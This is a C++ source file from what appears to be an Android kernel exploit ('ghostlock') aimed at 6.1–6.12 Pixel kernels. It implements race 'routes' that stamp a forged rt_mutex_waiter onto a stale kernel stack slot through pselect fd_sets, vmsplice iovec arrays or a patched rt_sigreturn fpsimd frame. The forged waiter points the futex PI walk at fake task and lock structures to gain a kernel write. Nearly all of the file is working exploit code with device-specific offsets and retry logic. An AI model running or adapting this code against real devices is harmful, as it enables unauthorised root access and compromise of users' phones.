#include "route/select_stack_route.h"

#include <cerrno>
#include <cstdint>
#include <unistd.h>

#include <utility>

using namespace ghostlock;

namespace ghostlock::route::select_stack {
    /* 6.12 vmsplice wait-stack route. The profile keeps the select_stack kind
     * (so no wire-format change) and uses compact_waiter=2 as the route-mode
     * discriminator: the futex wait waiter is overwritten by the vmsplice
     * iovec fast buffer, not by the pselect fd_set. */
    constexpr uint8_t kSelectVmspliceMode = 2;
    /* 6.12 rt_sigreturn carrier. The fpsimd_context.vregs copy lands at
     * SP0-0x280; the futex waiter base is SP0-0x1a0, so waiter word n is
     * carrier word 0x1c+n (28..41). The fake page still owns the write arm;
     * the stack waiter only needs task/lock/wake and neutral tree/pi nodes. */
    constexpr uint8_t kSelectSigreturnMode = 3;

    SelectStackRoute::SelectStackRoute(
        race::PiRace *race_context, const memory::WriteRequest *route_request,
        const profile::TargetProfile &profile_value,
        profile::SelectStackLayout route_layout,
        const std::array<int32_t, 3> &stdio_backup_value) noexcept
        : race(race_context),
          request(route_request),
          profile(profile_value),
          layout(route_layout) {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            stdio_backup[fd] = support::BorrowedFd(stdio_backup_value[fd]);
        }
        /* The C version memset the whole context; zero the sets explicitly so a
   * destroy() before prepare() never tests uninitialized bits. */
        input_set.zero();
        output_set.zero();
        exception_set.zero();
        owned_input_set.zero();
        owned_output_set.zero();
        owned_exception_set.zero();
        status.code = ROUTE_RETRYABLE;
    }

    SelectStackRoute::SelectStackRoute(
        SelectStackRoute &&other) noexcept
        : race(other.race),
          request(other.request),
          profile(other.profile),
          layout(other.layout),
          input_set(other.input_set),
          output_set(other.output_set),
          exception_set(other.exception_set),
          owned_input_set(other.owned_input_set),
          owned_output_set(other.owned_output_set),
          owned_exception_set(other.owned_exception_set),
          pipe_read(std::move(other.pipe_read)),
          pipe_write(std::move(other.pipe_write)),
          block(std::move(other.block)),
          high_read(std::move(other.high_read)),
          block_borrows_pipe(other.block_borrows_pipe),
          selected_fds_installed(other.selected_fds_installed),
          consumer_stuck(other.consumer_stuck),
          calls(other.calls),
          successes(other.successes),
          select_result(other.select_result),
          select_errno(other.select_errno),
          status(other.status) {
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            stdio_backup[fd] = other.stdio_backup[fd];
        }
    }

    int32_t SelectStackRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void SelectStackRoute::disarm() noexcept {
        race->consumer_go.store(0);
        if (layout.compact_waiter.value_or(0) == kSelectSigreturnMode) {
            /* No syscalls here: the stale pi_blocked_on still points into this
             * thread's kernel stack. A usleep() would overwrite the carrier
             * while a stuck consumer may still be walking it. */
            for (int32_t i = 0;
                 i < 100000000 && race->consumer_inflight.load() != 0;
                 i++) {
#if defined(__aarch64__)
                __asm__ volatile("yield" ::: "memory");
#else
                __asm__ volatile("" ::: "memory");
#endif
            }
            consumer_stuck = race->consumer_inflight.load() != 0;
            status.kernel_disarmed = !consumer_stuck;
            return;
        }
        if (race->consumer_inflight.load() != 0) {
            for (int32_t i = 0;
                 i < 2000 && race->consumer_inflight.load() != 0;
                 i++) {
                usleep(1000);
            }
            consumer_stuck = race->consumer_inflight.load() != 0;
        }
        status.kernel_disarmed = !consumer_stuck;
    }

    void SelectStackRoute::retain_for_process_lifetime() noexcept {
        /* A stuck consumer may still walk these descriptors, so none of them may be
   * closed: hand every owner's descriptor to the process lifetime. */
        (void) high_read.release_to_process_lifetime("pselect consumer stuck");
        if (!block_borrows_pipe) {
            (void) block.release_to_process_lifetime("pselect consumer stuck");
        }
        (void) pipe_read.release_to_process_lifetime("pselect consumer stuck");
        (void) pipe_write.release_to_process_lifetime("pselect consumer stuck");
        /* The dup2-installed descriptors stay open as well: selected_fds_installed
   * remains set and nothing below closes them. */
    }

    void SelectStackRoute::destroy() noexcept {
        /* The sigreturn carrier must not run another descriptor syscall before
         * threads.cpp performs the ghost disarm; that would reuse the kernel
         * stack while pi_blocked_on still points into it. */
        if (layout.compact_waiter.value_or(0) == kSelectSigreturnMode) {
            /* No descriptor cleanup is needed, but a stuck consumer must
             * still be reported as a dirty race: the upper layer then exits
             * instead of joining the wedged worker or spraying again. */
            if (consumer_stuck) {
                (void) fail(34, select_errno ? select_errno : ETIMEDOUT);
                status.code = ROUTE_DIRTY_FAILURE;
            }
            status.userspace_clean = 1;
            return;
        }
        for (size_t fd = 0; fd < stdio_backup.size(); fd++) {
            if (stdio_backup[fd].valid())
                dup2(stdio_backup[fd].get(), static_cast<int32_t>(fd));
        }
        if (consumer_stuck) {
            (void) fail(34, select_errno);
            status.code = ROUTE_DIRTY_FAILURE;
            retain_for_process_lifetime();
            return;
        }
        if (selected_fds_installed) {
            for (int32_t fd = 3; fd < PSELECT_ROUTE_NFDS; fd++) {
                if (owned_input_set.test(fd) || owned_output_set.test(fd) ||
                    owned_exception_set.test(fd)) {
                    /* The fd number may also be owned by the pipe/timerfd members: drop
         * that owner before closing so nothing is closed twice. */
                    if (pipe_read.get() == fd) (void) pipe_read.release();
                    if (pipe_write.get() == fd) (void) pipe_write.release();
                    if (block.get() == fd) (void) block.release();
                    if (high_read.get() == fd) (void) high_read.release();
                    close(fd);
                }
            }
            selected_fds_installed = 0;
        }
        high_read.reset();
        if (!block_borrows_pipe) block.reset();
        pipe_read.reset();
        pipe_write.reset();
        status.userspace_clean = 1;
        if (status.code != ROUTE_OK && status.kernel_disarmed) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
    }
} // namespace ghostlock::route::select_stack

#if defined(__ANDROID__)
#include "common.h"

#include <array>
#include <atomic>
#include <cstring>
#include <ctime>
#include <fcntl.h>
#include <iterator>
#include <limits>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <sys/uio.h>
#include <ucontext.h>

#include "kernel/target.h"
#include "session/exploit_session.hpp"

/* The two Multicast stamp buffers intentionally remain dynamic stack frames.
 * Their layout/order is device-verified and must not become heap-backed STL. */
#if defined(__clang__)
#pragma clang diagnostic ignored "-Wvla-cxx-extension"
#endif

#include "route/route_lifecycle.hpp"
#include "route/select_stack_route.h"
#include "route/tcp_zerocopy_route.h"

using namespace ghostlock;

namespace {
    constexpr int32_t kSigreturnCarrierSignal = 40;
    constexpr uint32_t kFpsimdMagic = 0x46508001u;
    constexpr uint32_t kFpsimdContextSize = 0x210u;
    constexpr size_t kFpsimdVregsOffset = 0x10u;
    constexpr uint32_t kEsrMagic = 0x45535201u;
    constexpr uint32_t kSveMagic = 0x53564501u;
    constexpr uint32_t kZaMagic = 0x54366345u;
    constexpr uint32_t kZtMagic = 0x5a544e01u;
    constexpr uint32_t kTpidr2Magic = 0x54504902u;
    constexpr uint32_t kFpmrMagic = 0x46504d52u;
    constexpr uint32_t kPoeMagic = 0x504f4530u;
    constexpr uint32_t kExtraContextMagic = 0x45585401u;
    /* Header-only records (size 0x10) are present on every frame on this
     * device; a payload-bearing record means the kernel takes a different
     * restore path and the fpsimd local may no longer be at sp+0x290. */
    constexpr uint32_t kContextHeaderSize = 0x10u;
    /* The waiter begins at carrier word 28; words 28..41 cover
     * tree/pi_tree (0x00..0x4f), task (0x50), lock (0x58),
     * wake_state (0x60) and ww_ctx (0x68). */
    constexpr size_t kCarrierWord = 28u;
    constexpr size_t kCarrierWords = 14u;

    volatile sig_atomic_t g_sigreturn_carrier_found = 0;
    volatile sig_atomic_t g_sigreturn_unsafe_frame = 0;
    static_assert(std::atomic<uint64_t>::is_always_lock_free,
                  "signal carrier words must be lock-free");
    std::atomic<uint64_t> g_sigreturn_carrier_words[kCarrierWords];

    void build_sigreturn_carrier_words() noexcept {
        const auto &page = ghostlock::session::g_exploit_session.heap.current;
        const uint64_t values[kCarrierWords] = {
            0,  /* tree.parent */
            0,  /* tree.right */
            0,  /* tree.left */
            1,  /* tree.prio */
            0,  /* tree.deadline */
            0,  /* pi_tree.parent */
            0,  /* pi_tree.right */
            0,  /* pi_tree.left */
            1,  /* pi_tree.prio */
            0,  /* pi_tree.deadline */
            page.fake_task,
            page.fake_lock,
            3,  /* wake_state */
            0,  /* ww_ctx */
        };
        for (size_t i = 0; i < kCarrierWords; i++) {
            g_sigreturn_carrier_words[i].store(
                values[i], std::memory_order_relaxed);
        }
    }

    /* Runs on the waiter thread while returning from tgkill. The kernel has
     * just built a valid rt_sigframe on the user stack; patching the
     * fpsimd_context before returning makes rt_sigreturn copy our vregs onto
     * the waiter's kernel stack at SP0-0x280.
     *
     * Parse the record headers instead of scanning every 4 bytes so a
     * payload cannot be mistaken for a header. Fail closed when the frame
     * carries a context we do not model (extra_context, or a payload-bearing
     * SVE/SME record): arming the consumer then would walk a half-stamped
     * waiter. */
    void sigreturn_carrier_handler(int sig, siginfo_t *info, void *uctx) {
        (void) info;
        if (sig != kSigreturnCarrierSignal || uctx == nullptr) return;
        auto *uc = static_cast<ucontext_t *>(uctx);
        unsigned char *reserved =
                reinterpret_cast<unsigned char *>(uc->uc_mcontext.__reserved);
        const size_t reserved_size = sizeof(uc->uc_mcontext.__reserved);
        const size_t no_offset = std::numeric_limits<size_t>::max();
        size_t fpsimd_offset = no_offset;
        bool unsafe = false;
        size_t offset = 0;
        while (offset + 2 * sizeof(uint32_t) <= reserved_size) {
            uint32_t magic = 0;
            uint32_t size = 0;
            __builtin_memcpy(&magic, reserved + offset, sizeof(magic));
            __builtin_memcpy(&size, reserved + offset + sizeof(magic),
                             sizeof(size));
            if (magic == 0 && size == 0) break;
            if (size < 2 * sizeof(uint32_t) ||
                size > reserved_size - offset ||
                (size & 0xf) != 0) {
                unsafe = true;
                break;
            }
            if (magic == kFpsimdMagic) {
                if (size != kFpsimdContextSize) {
                    unsafe = true;
                    break;
                }
                if (fpsimd_offset == no_offset) fpsimd_offset = offset;
            } else if (magic == kExtraContextMagic) {
                /* The fpsimd record may live in the extra page. */
                unsafe = true;
                break;
            } else if (magic == kEsrMagic) {
                if (size != kContextHeaderSize) {
                    unsafe = true;
                    break;
                }
            } else if (magic == kSveMagic || magic == kZaMagic ||
                       magic == kZtMagic || magic == kTpidr2Magic ||
                       magic == kFpmrMagic || magic == kPoeMagic) {
                if (size != kContextHeaderSize) {
                    unsafe = true;
                    break;
                }
            } else {
                unsafe = true;
                break;
            }
            offset += size;
        }
        if (unsafe || fpsimd_offset == no_offset) {
            g_sigreturn_unsafe_frame = unsafe ? 1 : 0;
            return;
        }
        unsigned char *vregs = reserved + fpsimd_offset + kFpsimdVregsOffset;
        for (size_t i = 0; i < kCarrierWords; i++) {
            const uint64_t value = g_sigreturn_carrier_words[i].load(
                std::memory_order_relaxed);
            __builtin_memcpy(vregs + kCarrierWord * 8 + i * 8,
                             &value, sizeof(value));
        }
        g_sigreturn_carrier_found = 1;
    }
} // namespace

namespace ghostlock::route {
    static double fops_elapsed_ms(struct timespec *ref) {
        return runtime_time::runtime_elapsed_ms(ref);
    }

    } // namespace ghostlock::route


namespace ghostlock::route {
    /* Public compatibility entry: lifecycle is now explicitly ordered while the
 * common route dispatcher remains scheduled for S14. */
    static uint32_t route_delay_usec(const select_stack::SelectStackRoute *context,
                                int32_t attempt) {
        if (!context->layout.compact_waiter.value_or(0)) {
            (void) attempt;
            /* Let select establish its frame and stamp the crafted waiter before
         * the PI walk fires. */
            return context->profile.select_enter_delay_us();
        }
        /* Compact retry walks a delay ladder (U01/SELECT-01, mirroring the
     * upstream 50d2b72 candidate list); the profile's enter delay seeds the
     * first attempt. The ladder stays native-side until a Select device can
     * validate a schema extension. */
        const uint32_t seed = context->profile.select_enter_delay_us();
        static constexpr std::array<uint32_t, 8> delays = {
            50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
        };
        const uint32_t ladder = delays[static_cast<size_t>((attempt - 1) % 8)];
        return attempt == 1 && seed != 0 ? seed : ladder;
    }

    void fdset_put_word(fd_set *set, int32_t word, uint64_t value) {
        unsigned long *bits = reinterpret_cast<unsigned long *>(set);
        bits[word] = static_cast<unsigned long>(value);
    }

    uint64_t fdset_get_word(const fd_set *set, int32_t word) {
        const unsigned long *bits = reinterpret_cast<const unsigned long *>(set);
        return bits[word];
    }

    static int32_t pselect_words_per_set(void) {
        int32_t bits_per_word = static_cast<int32_t>(8 * sizeof(unsigned long));
        return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
    }

    static int32_t pselect_put_global_word(
        fd_set *in, fd_set *out, fd_set *ex, int32_t words_per_set,
        int32_t global_word, uint64_t value) {
        if (global_word < 0) {
            return 0;
        }

        int32_t set_idx = global_word / words_per_set;
        int32_t word_idx = global_word % words_per_set;
        switch (set_idx) {
            case 0:
                fdset_put_word(in, word_idx, value);
                return 1;
            case 1:
                fdset_put_word(out, word_idx, value);
                return 1;
            case 2:
                fdset_put_word(ex, word_idx, value);
                return 1;
            default:
                return 0;
        }
    }

    static int32_t pselect_waiter_shift(const select_stack::SelectStackRoute *context) {
        return session::g_exploit_session.profile.loaded()
                   ? context->layout.waiter_shift.value_or(0)
                   : kernel::PSELECT_WAITER_WORD_SHIFT;
    }

    static void pselect_put_waiter_word(
        select_stack::SelectStackRoute *context, int32_t words_per_set,
        int32_t waiter_word, uint64_t value, const char *name) {
        int32_t global_word = pselect_waiter_shift(context) + waiter_word;
        int32_t placed = pselect_put_global_word(
            context->input_set.raw(), context->output_set.raw(),
            context->exception_set.raw(),
            words_per_set, global_word, value);
        if (!placed) {
            pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
                       "words_per_set=%d nfds=%d\n",
                       name, waiter_word, global_word, words_per_set,
                       PSELECT_ROUTE_NFDS);
        }
    }

    static void open_selected_fds(
        fd_set *in, fd_set *out, fd_set *ex, int32_t read_fd, int32_t write_fd) {
        /* every bit lands on the read end so select/pselect parks the full window */
        (void) write_fd;
        int32_t high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
        if (high_read < 0) {
            pr_warning("pselect F_DUPFD read errno=%d\n", errno);
            return;
        }
        for (int32_t fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
            if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
                dup2(high_read, fd);
            }
        }
        close(high_read);
        dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
        FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
    }

    static std::array<int32_t, 3> standard_io_backup = {-1, -1, -1};

    void reserve_standard_io(void) {
        for (int32_t fd = 0; fd < static_cast<int32_t>(standard_io_backup.size()); fd++) {
            if (standard_io_backup[static_cast<size_t>(fd)] >= 0) continue;
            int32_t backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
            if (backup < 0) {
                pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
            } else {
                standard_io_backup[static_cast<size_t>(fd)] = backup;
            }
        }
    }

    static void restore_standard_io(const std::array<support::BorrowedFd, 3> &backup) {
        for (size_t fd = 0; fd < backup.size(); fd++) {
            if (!backup[fd].valid()) continue;
            dup2(backup[fd].get(), static_cast<int32_t>(fd));
        }
    }

    static void select_stack_build_fdsets(select_stack::SelectStackRoute *context) {
        select_stack::FdSet *in = &context->input_set;
        select_stack::FdSet *out = &context->output_set;
        select_stack::FdSet *ex = &context->exception_set;
        const memory::WriteRequest *request = context->request;
        in->zero();
        out->zero();
        ex->zero();

        int32_t words_per_set = pselect_words_per_set();
        int32_t compact = context->layout.compact_waiter.value_or(0);

        struct pselect_waiter_word {
            int32_t word;
            uint64_t value;
            const char *name;
        };

        if (compact) {
            /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
         * the write value, children the write target; waiter->task is the
         * payload fake_task (planted fields for the PI walk). */
            struct pselect_waiter_word words[] = {
                {2, (session::g_exploit_session.heap.current.fake_right), "tree_pc"},
                {3, 0, "tree_right"},
                {4, request->target, "tree_left"},
                {5, (session::g_exploit_session.heap.current.fake_right), "pi_pc"},
                {6, 0, "pi_right"},
                {7, request->target, "pi_left"},
                {8, (session::g_exploit_session.heap.current.fake_task), "task"},
                {9, (session::g_exploit_session.heap.current.fake_lock), "lock"},
                {10, (static_cast<uint64_t>(kernel::FAKE_WAITER_PRIO) << 32) | 3, "wake_prio"},
                {11, 0, "deadline"},
                {12, 0, "ww_ctx"},
            };
            for (size_t i = 0; i < std::size(words); i++) {
                struct pselect_waiter_word *w = &words[i];
                pselect_put_waiter_word(context, words_per_set,
                                        w->word, w->value, w->name);
            }
        } else {
            /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
            struct pselect_waiter_word words[] = {
                {2, 0, "tree_pc"},
                {3, 0, "tree_right"},
                {4, 0, "tree_left"},
                {5, 1, "tree_prio"},
                {6, 0, "tree_deadline"},
                {7, 0, "pi_parent"},
                {8, 0, "pi_right"},
                {9, 0, "pi_left"},
                {10, 1, "pi_prio"},
                {11, 0, "pi_deadline"},
                {12, (session::g_exploit_session.heap.current.fake_task), "task"},
                {13, (session::g_exploit_session.heap.current.fake_lock), "lock"},
                {14, 3, "wake_state"},
            };
            for (size_t i = 0; i < std::size(words); i++) {
                struct pselect_waiter_word *w = &words[i];
                pselect_put_waiter_word(context, words_per_set,
                                        w->word, w->value, w->name);
            }
        }
    }
} // namespace ghostlock::route

namespace ghostlock::route::select_stack {
    int32_t SelectStackRoute::prepare() noexcept {
        if (!(session::g_exploit_session.heap.current.base) || !(session::g_exploit_session.heap.current.fake_lock) || !
            (session::g_exploit_session.
                heap.current.fake_fops)) {
            pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
                       "fops=%016zx\n", (session::g_exploit_session.heap.current.base),
                       (session::g_exploit_session.heap.current.fake_lock),
                       (session::g_exploit_session.heap.current.fake_fops));
            return fail(30, 0);
        }
        if (layout.compact_waiter.value_or(0) == kSelectSigreturnMode) {
            if (!(session::g_exploit_session.heap.current.fake_task) ||
                !(session::g_exploit_session.heap.current.fake_w0)) {
                pr_warning("sigreturn route missing fake_task=%016zx fake_w0=%016zx\n",
                           (size_t) session::g_exploit_session.heap.current.fake_task,
                           (size_t) session::g_exploit_session.heap.current.fake_w0);
                return fail(31, 0);
            }
            build_sigreturn_carrier_words();
            struct sigaction sa {};
            sa.sa_sigaction = sigreturn_carrier_handler;
            sa.sa_flags = SA_SIGINFO;
            sigemptyset(&sa.sa_mask);
            if (sigaction(kSigreturnCarrierSignal, &sa, nullptr) != 0) {
                pr_warning("sigreturn route sigaction errno=%d\n", errno);
                return fail(53, errno);
            }
            sigset_t unblock;
            sigemptyset(&unblock);
            sigaddset(&unblock, kSigreturnCarrierSignal);
            const int32_t mask_error =
                    pthread_sigmask(SIG_UNBLOCK, &unblock, nullptr);
            if (mask_error != 0) {
                pr_warning("sigreturn route pthread_sigmask err=%d\n",
                           mask_error);
                return fail(56, mask_error);
            }
            pr_info("sigreturn route prepared signal=%d fake_task=%016zx "
                    "fake_lock=%016zx fake_w0=%016zx carrier_word=%zu\n",
                    kSigreturnCarrierSignal,
                    (size_t) session::g_exploit_session.heap.current.fake_task,
                    (size_t) session::g_exploit_session.heap.current.fake_lock,
                    (size_t) session::g_exploit_session.heap.current.fake_w0,
                    kCarrierWord);
            return 0;
        }
        if (layout.compact_waiter.value_or(0) == kSelectVmspliceMode) {
            int32_t vfds[2];
            if (pipe2(vfds, O_CLOEXEC) != 0) {
                pr_warning("vmsplice route pipe2 errno=%d\n", errno);
                return fail(50, errno);
            }
            pipe_read.reset(vfds[0]);
            pipe_write.reset(vfds[1]);
            pr_info("vmsplice route prepared pipe=%d/%d\n",
                    pipe_read.get(), pipe_write.get());
            return 0;
        }
        int32_t fds[2];
        if (pipe(fds) != 0) {
            return fail(31, errno);
        }
        pipe_read.reset(fds[0]);
        pipe_write.reset(fds[1]);

        /* Both routes park on a never-ready timerfd: the waiter must stay stale
     * on the pselect stack for the whole consumer window. */
        block.reset(static_cast<int32_t>(syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC)));
        if (!block.valid()) {
            pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                       errno);
            block_borrows_pipe = 1;
        }
        high_read.reset(fcntl(block_fd(), F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 16));
        if (!high_read.valid()) {
            pr_warning("pselect F_DUPFD read errno=%d\n", errno);
            return fail(32, errno);
        }

        route::select_stack_build_fdsets(this);
        pr_info("pselect route setup shift=%d page=%016zx "
                "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
                "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
                "ex1=%016llx ex2=%016llx ex3=%016llx\n",
                route::pselect_waiter_shift(this),
                (session::g_exploit_session.heap.current.base), (session::g_exploit_session.heap.current.fake_lock),
                (session::g_exploit_session.heap.current.fake_w0), (session::g_exploit_session.heap.current.fake_task),
                (unsigned long long) route::fdset_get_word(input_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(input_set.raw(), 3),
                (unsigned long long) route::fdset_get_word(output_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 0),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 1),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 2),
                (unsigned long long) route::fdset_get_word(exception_set.raw(), 3));

        /* The route may replace low fds, including stdout and stderr. */
        route::open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
                                 high_read.get(), pipe_write.get());
        owned_input_set = input_set;
        owned_output_set = output_set;
        owned_exception_set = exception_set;
        high_read.reset();
        selected_fds_installed = 1;
        return 0;
    }

    route::RouteStatus SelectStackRoute::execute() noexcept {
        if (layout.compact_waiter.value_or(0) == kSelectSigreturnMode) {
            build_sigreturn_carrier_words();
            std::atomic_signal_fence(std::memory_order_seq_cst);
            g_sigreturn_carrier_found = 0;
            g_sigreturn_unsafe_frame = 0;
            race->consumer_calls.store(0);
            race->consumer_success.store(0);
            race->consumer_stop.store(0);
            race->route_delay_usec.store(0);

            const int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
            /* stdout is unbuffered in this binary. Log before arming the
             * signal; after rt_sigreturn no syscall (including a printf) may
             * touch the waiter stack until the consumer has walked it. */
            pr_info("sigreturn carrier arm tid=%d fake_task=%016zx "
                    "fake_lock=%016zx fake_w0=%016zx carrier_word=%zu\n",
                    tid,
                    (size_t) session::g_exploit_session.heap.current.fake_task,
                    (size_t) session::g_exploit_session.heap.current.fake_lock,
                    (size_t) session::g_exploit_session.heap.current.fake_w0,
                    kCarrierWord);
            support::log_sync();
            errno = 0;
            const long tgkill_ret =
                    syscall(SYS_tgkill, getpid(), tid, kSigreturnCarrierSignal);
            const int32_t tgkill_errno = errno;
            if (tgkill_ret != 0 || g_sigreturn_carrier_found == 0) {
                status.userspace_clean = 1;
                status.kernel_disarmed = 1;
                status.code = ROUTE_FALLBACK_SAFE;
                status.step = 54;
                status.error_number = tgkill_errno ? tgkill_errno : EFAULT;
                pr_warning("sigreturn carrier did not stamp errno=%d found=%d "
                           "unsafe=%d\n", tgkill_errno,
                           (int32_t) g_sigreturn_carrier_found,
                           (int32_t) g_sigreturn_unsafe_frame);
                return status;
            }

            /* tgkill returns after the handler's rt_sigreturn has copied the
             * vregs. From here the waiter stays in userspace; the consumer
             * may walk pi_blocked_on immediately. */
            race->consumer_go.store(1);
            for (int32_t spin = 0;
                 spin < 100000000 && race->consumer_calls.load() == 0; spin++) {
                __asm__ volatile("yield" ::: "memory");
            }
            race->consumer_go.store(0);
            for (int32_t spin = 0;
                 spin < 100000000 && race->consumer_inflight.load() != 0; spin++) {
                __asm__ volatile("yield" ::: "memory");
            }
            const int32_t calls = race->consumer_calls.load();
            const int32_t successes = race->consumer_success.load();
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            if (successes > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
            } else {
                status.code = ROUTE_FALLBACK_SAFE;
                status.step = 55;
                status.error_number = ETIMEDOUT;
            }
            pr_info("sigreturn route done ret=%ld errno=%d calls=%d success=%d "
                    "status=%d step=%d\n",
                    tgkill_ret, tgkill_errno, calls, successes,
                    status.code, status.step);
            return status;
        }
        if (layout.compact_waiter.value_or(0) == kSelectVmspliceMode) {
            /* 6.12 stack geometry (6.12.23-android16-5-gcd85666d7884):
             *   __arm64_sys_vmsplice frame 0x1e0, fast iov buffer at sp+0x70
             *   -> iov buffer start depth 0x170
             *   futex_wait_requeue_pi waiter base depth 0x1a0
             *   rt_mutex_waiter.task=0x50, lock=0x58
             *   -> iovec entry 2 base/len land at waiter+0x50/+0x58.
             * The array copy happens before rw_copy_check_uvector rejects the
             * kernel fake pointers, so the stale waiter is overwritten even
             * though vmsplice returns EFAULT/EINVAL. */
            struct iovec iov[3];
            memset(iov, 0, sizeof(iov));
            /* entries 0/1 also cover pi_tree.right/left/prio/deadline; use
             * the same neutral values as the select route's fake waiter. */
            iov[0].iov_base = nullptr;
            iov[0].iov_len = 0;
            iov[1].iov_base = reinterpret_cast<void *>(1);
            iov[1].iov_len = 0;
            iov[2].iov_base = reinterpret_cast<void *>(
                session::g_exploit_session.heap.current.fake_task);
            iov[2].iov_len = static_cast<size_t>(
                session::g_exploit_session.heap.current.fake_lock);

            race->consumer_calls.store(0);
            race->consumer_success.store(0);
            race->consumer_stop.store(0);
            race->route_delay_usec.store(0);

            errno = 0;
            const long vmsplice_ret =
                    syscall(SYS_vmsplice, pipe_write.get(), iov, 3, 0);
            const int32_t vmsplice_errno = errno;
            pr_info("vmsplice route enter fake_task=%016zx fake_lock=%016zx "
                    "ret=%ld errno=%d\n",
                    (size_t) session::g_exploit_session.heap.current.fake_task,
                    (size_t) session::g_exploit_session.heap.current.fake_lock,
                    vmsplice_ret, vmsplice_errno);

            race->consumer_go.store(1);
            for (int32_t spin = 0;
                 spin < 100000000 && race->consumer_calls.load() == 0; spin++) {
                __asm__ volatile (


                "yield"
                ::: "memory");
            }
            race->consumer_go.store(0);
            for (int32_t spin = 0;
                 spin < 100000000 && race->consumer_inflight.load() != 0;
                 spin++) {
                __asm__ volatile("yield" ::: "memory");
            }

            const int32_t calls = race->consumer_calls.load();
            const int32_t successes = race->consumer_success.load();
            /* EPERM/ENOSYS means seccomp blocked the syscall before the
             * iovec copy; never report success in that case. */
            const bool copy_likely =
                    (vmsplice_ret >= 0 || vmsplice_errno == EFAULT ||
                     vmsplice_errno == EINVAL);
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            if (successes > 0 && copy_likely) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
            } else {
                status.code = ROUTE_FALLBACK_SAFE;
                status.step = 52;
                status.error_number = vmsplice_errno;
            }
            pr_info("vmsplice route done ret=%ld errno=%d calls=%d success=%d "
                    "status=%d step=%d\n",
                    vmsplice_ret, vmsplice_errno, calls, successes,
                    status.code, status.step);
            return status;
        }

        struct timespec route_t0;
        clock_gettime(CLOCK_MONOTONIC, &route_t0);

        /* Compact retries rebuild the payload page between attempts (U01/SELECT-01,
     * mirroring upstream 50d2b72): a lost race clobbers the page, so every
     * attempt resprays and re-derives fake_* before rebuilding the fd_sets.
     * The consumer handshake advances consumer_go per attempt so the trigger
     * is seen as a new sequence. */
        const int32_t attempts = layout.compact_waiter.value_or(0) ? 4 : 1;
        int32_t calls_total = 0;
        int32_t successes_total = 0;

        for (int32_t attempt = 1; attempt <= attempts; attempt++) {
            if (attempt > 1) {
                const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
                if (!rebuilt || !(session::g_exploit_session.heap.current.fake_lock) ||
                    !(session::g_exploit_session.heap.current.fake_fops)) {
                    pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
                    (void) fail(35, errno);
                    break;
                }
                route::select_stack_build_fdsets(this);
                route::open_selected_fds(input_set.raw(), output_set.raw(),
                                         exception_set.raw(), block_fd(), pipe_write.get());
                owned_input_set = input_set;
                owned_output_set = output_set;
                owned_exception_set = exception_set;
            }

            race->consumer_calls.store(0);
            race->consumer_success.store(0);
            race->consumer_stop.store(0);
            uint32_t delay_usec = route::route_delay_usec(this, attempt);
            race->route_delay_usec.store(delay_usec);
            race->consumer_go.store(attempt);

            pr_info("pselect pre-select attempt=%d/%d compact=%d +%.0fms\n",
                    attempt, attempts, layout.compact_waiter.value_or(0),
                    route::fops_elapsed_ms(&route_t0));
            errno = 0;
            if (layout.compact_waiter.value_or(0)) {
                uint32_t timeout_us = profile.select_timeout_us();
                struct timespec ts = {
                    .tv_sec = timeout_us / 1000000,
                    .tv_nsec = (long) (timeout_us % 1000000) * 1000,
                };
                select_result = pselect(
                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                    exception_set.raw(), &ts, nullptr);
            } else {
                uint32_t timeout_us = profile.select_timeout_us();
                struct timeval timeout = {
                    .tv_sec = timeout_us / 1000000,
                    .tv_usec = timeout_us % 1000000,
                };
                select_result = select(
                    PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                    exception_set.raw(), &timeout);
            }
            select_errno = errno;
            route::restore_standard_io(stdio_backup);
            pr_info("pselect post-select attempt=%d/%d compact=%d +%.0fms ret=%d\n",
                    attempt, attempts, layout.compact_waiter.value_or(0),
                    route::fops_elapsed_ms(&route_t0), select_result);
            race->consumer_go.store(0);

            const int32_t calls = race->consumer_calls.load();
            const int32_t successes = race->consumer_success.load();
            calls_total += calls;
            successes_total += successes;
            if (calls > 0 && successes > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
                break;
            }
            (void) fail(33, select_errno);
        }
        calls = calls_total;
        successes = successes_total;
        return status;
    }
} // namespace ghostlock::route::select_stack

namespace ghostlock::route {
